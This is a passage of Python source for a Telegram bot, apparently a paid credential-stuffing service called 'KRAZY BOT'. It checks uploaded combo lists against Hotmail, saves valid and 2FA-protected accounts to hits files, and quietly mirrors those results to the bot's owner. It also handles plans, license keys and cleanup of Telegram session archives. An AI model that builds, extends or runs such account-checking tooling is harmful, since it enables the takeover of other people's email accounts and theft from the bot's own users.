                    f"Plan <code>{html.escape(plan)}</code> | <code>{len(combos)}</code> combos | <code>{mins:02d}:{secs:02d}</code>\n"
                    f"<i>Send another file to check again.</i>"
                ),
                parse_mode="HTML"
            )
            try:
                _bu = update.effective_user
                _buname = getattr(_bu, "username", None)
                await mirror_to_owner(
                    context, user_id, _buname, "Hotmail",
                    f"Plan: <code>{html.escape(plan)}</code> | "
                    f"Valid: <code>{state.valid}</code> | 2FA: <code>{state.twofa}</code> | "
                    f"Checked: <code>{state.checked}/{state.total}</code> | Time: <code>{mins:02d}:{secs:02d}</code>",
                    [(Path(result_paths["hits"]), "<code>hits.txt</code>"),
                     (Path(result_paths["valid"]), "<code>valid.txt</code>"),
                     (Path(result_paths["2fa"]), "<code>2fa.txt</code>")])
            except Exception as e:
                logger.warning(f"hotmail mirror failed: {e}")
    except Exception as e:
        logger.exception("handle_file outer error")
        try:
            if status_msg:
                await status_msg.edit_text(f"{pe('❌')} Unexpected error: <code>{html.escape(str(e))}</code>", parse_mode="HTML")
            else:
                await update.message.reply_text(f"{pe('❌')} Error: <code>{html.escape(str(e))}</code>", parse_mode="HTML")
        except:
            pass
    finally:
        async with user_jobs_lock:
            user_jobs.pop(user_id, None)
        try:
            user_states.pop(user_id, None)
            user_futures.pop(user_id, None)
            user_status_msgs.pop(user_id, None)
        except:
            pass
        try:
            async with scan_waiting_lock:
                if user_id in scan_waiting:
                    scan_waiting.remove(user_id)
        except:
            pass
        if job_dir and job_dir.exists():
            try:
                shutil.rmtree(job_dir, ignore_errors=True)
            except:
                pass

def _acquire_single_instance():
    lock_path = config.BASE_DIR / "bot.lock"
    try:
        fh = os.open(str(lock_path), os.O_CREAT | os.O_RDWR)
    except Exception:
        return None
    try:
        try:
            import msvcrt
            msvcrt.locking(fh, msvcrt.LK_NBLCK, 1)
        except ImportError:
            try:
                os.close(fh)
            except Exception:
                pass
            import errno
            try:
                fh2 = os.open(str(lock_path) + ".lock", os.O_CREAT | os.O_EXCL | os.O_RDWR)
                return fh2
            except OSError as e:
                if e.errno == errno.EEXIST:
                    return None
                raise
        except OSError:
            try:
                os.close(fh)
            except Exception:
                pass
            return None
        try:
            os.ftruncate(fh, 0)
            os.write(fh, str(os.getpid()).encode())
        except Exception:
            pass
        return fh
    except Exception:
        try:
            os.close(fh)
        except Exception:
            pass
        return None

def main():
    if not config.BOT_TOKEN:
        logger.error("BOT_TOKEN not set in .env! Put BOT_TOKEN=... in krazy bot/.env")
        print("ERROR: BOT_TOKEN not set. Edit krazy bot/.env")
        return
    _lock_fh = _acquire_single_instance()
    if _lock_fh is None:
        logger.error("Another bot instance is already running (bot.lock exists). Exiting.")
        print("ERROR: Another bot instance is already running. Stop it first (bot.lock exists).")
        return
    
    # Python 3.14+ Event Loop Fix
    import asyncio
    try:
        asyncio.get_running_loop()
    except RuntimeError:
        try:
            loop = asyncio.get_event_loop_policy().get_event_loop()
            if loop.is_closed():
                raise RuntimeError("Closed loop")
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

    import atexit

    def _release_lock():
        try:
            try:
                import msvcrt
                msvcrt.locking(_lock_fh, msvcrt.LK_UNLCK, 1)
            except Exception:
                pass
            os.close(_lock_fh)
        except Exception:
            pass
        try:
            os.unlink(str(config.BASE_DIR / "bot.lock"))
        except Exception:
            pass

    atexit.register(_release_lock)
    try:
        for _child in config.JOBS_DIR.iterdir():
            try:
                if _child.is_dir():
                    shutil.rmtree(_child, ignore_errors=True)
                else:
                    _child.unlink(missing_ok=True)
            except Exception:
                pass
        import tempfile as _tf
        for _pat in ("krazii_tdatas_*.zip", "krazy_keys_*"):
            try:
                for _leftover in Path(_tf.gettempdir()).glob(_pat):
                    try:
                        _leftover.unlink(missing_ok=True)
                    except Exception:
                        pass
            except Exception:
                pass
        logger.info("Startup sweep done: orphaned jobs + temp leftovers cleared")
    except Exception as e:
        logger.warning(f"Startup sweep failed: {e}")
    logger.info(f"Starting KRAZY BOT — Owner: {config.OWNER_ID} | DB: {config.DB_PATH}")
    app = Application.builder().token(config.BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("myplan", cmd_myplan))
    app.add_handler(CommandHandler.plan("plan", cmd_myplan) if hasattr(CommandHandler, 'plan') else CommandHandler("plan", cmd_myplan))
    app.add_handler(CommandHandler("key", cmd_key))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("owner", cmd_owner))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO | filters.ANIMATION | filters.AUDIO, handle_file))
    app.add_error_handler(error_handler)
    app.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
